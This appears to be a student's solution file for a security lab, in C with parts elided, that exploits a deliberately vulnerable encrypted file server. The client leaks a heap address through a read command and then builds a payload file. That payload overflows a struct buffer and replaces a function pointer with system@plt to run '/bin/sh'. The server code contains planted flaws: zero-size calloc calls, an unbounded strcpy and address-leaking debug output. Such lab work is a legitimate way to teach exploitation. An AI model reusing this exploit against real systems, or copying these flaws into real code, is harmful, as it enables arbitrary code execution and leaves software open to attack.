...
/* object storage - just one object */
...
#define A_OFFSET (144 - (16+9+12+17))
#define pack(addr, offset, value)  (*((int **)(addr+offset)) = value)


/* YOUR CODE */
int build_malread( struct rm_cmd *r, int sock, unsigned char *key )
{
	/* Local variables */
	ProtoMessageHdr hdr1;

	/* Send the command FILE_XFER_INIT*/
	hdr1.msgtype = FILE_XFER_INIT;
	hdr1.length = sizeof(struct rm_cmd) + r->len;
	if (send_message( sock, &hdr1, (char *)r ) == -1){
		printf("send_message error in build_malread, FILE_XFER_INIT.");
	}


	/* Local variables */
	ProtoMessageHdr hdr2;
	char E_block[MAX_BLOCK_SIZE];		

	/* Wait for READ_XFER_BLOCK message */
	if (wait_message( sock, &hdr2, E_block, READ_XFER_BLOCK ) == -1){
		printf("wait_message error in build_malread, READ_XFER_BLOCK.");
	}

	/* Wait for EXIT message*/
	ProtoMessageHdr hdr3;
	char blockExit[MAX_BLOCK_SIZE];
	if(wait_message( sock, &hdr3, blockExit, EXIT ) == -1){
		printf("wait_message error in build_malread, EXIT.");
	}
	...
	if (decrypt_message( (unsigned char *)E_block, hdr2.length, key, 
			      plaintext, &len_plaintext ) != 0){
		printf("decrypt_message error in build_malread.");
	}

	printf("build_malread decryption:\n");
	BIO_dump_fp (stdout, (const char *)plaintext, len_plaintext);

	/*---------------*/
	/*Building strn2-payload*/
	...
	memcpy(baseA.str, plaintext+24, 4);

	write_to_file("strn2-payload", "struct A 40\n", 12, FILE_CLEAR);
	
	//Place the arguments for system@plt
	write_to_file("strn2-payload", "string_d /bin/sh\n", 17, FILE_APPEND); 
	
	//Replace func[0] with system@plt
	write_to_file("strn2-payload", "num_a 134517148\n", 16, FILE_APPEND);//system@plt: 0x804919c = 134517148 in decimal value

	//Call system@plt(/bin/sh)
	write_to_file("strn2-payload", "string_d bla\n", 13, FILE_APPEND);

	//Overwrite &a on the stack with func[0] by overflowing the buffer
	len = 12 + 17 + 16 + 13; //the len of the file up to now...
	char* buf2 = (char *) malloc((152-len)*sizeof(char)); //152 = 2*sizeof(struct A)
	memset(buf2, 'a', (152-len));//put some garbage
	write_to_file("strn2-payload", buf2, (152-len), FILE_APPEND);

	pack(buf, 0, (int*)((int)baseA.ptr+26168));//offset = 0x6638 to decimal value = 26168
	write_to_file("strn2-payload", buf, 4, FILE_APPEND);

	printf("baseA+offset = func address :\n");
	BIO_dump_fp (stdout, (const char *)buf, 4);
...
{
	/* read from struct A object and return result */
	if ( r->cmd == CMD_READ ) {
		if ( perm_a != NULL ) {
			ProtoMessageHdr hdr;
			char outblock[MAX_BLOCK_SIZE];
			...
			unsigned int len = strlen( a->string_f );
			char *tmp = (char *)malloc( len );

			strcpy( tmp, a->string_f );  // read target is always string_f 

			printf("perm_a address: 0x%x; a addr: 0x%x; computed a addr: 0x%x; funcs address: 0x%x; and diff 0x%x\n",
			       perm_a, a, (struct A*)(*(int*)(tmp+20)), funcs, (int)funcs - (int)a);
			
			encrypt_message( (unsigned char *)tmp, len, key, 
					 (unsigned char *)outblock, &outbytes );
			hdr.msgtype = READ_XFER_BLOCK;
			hdr.length = outbytes;
			send_message( sock, &hdr, outblock );
		}
		else return -1;
...
int receive_write( struct rm_cmd *r, int sock, unsigned char *key )
{
	...
	a = perm_a;   // set to stored object if any

	if ( funcs == NULL ) {
		funcs = calloc(0, 3*sizeof(functype)); 
		funcs[0] = strncpy;
		funcs[1] = strncmp;
		funcs[2] = strncmp;
	}
	...
	/* perform write to create new object of type struct A */ 
	if ( r->cmd == CMD_WRITE ) {
		...
		if ( sscanf ( buf, "struct A %d", &index) == 1 ) {
			if (( !perm_a ) || ( perm_a->index != index )) {
				a = (struct A *)calloc(0, sizeof(struct A)); 
				if ( perm_a ) free( perm_a );
				a->index = index;
				perm_a = a;
				a->base = a;
			}
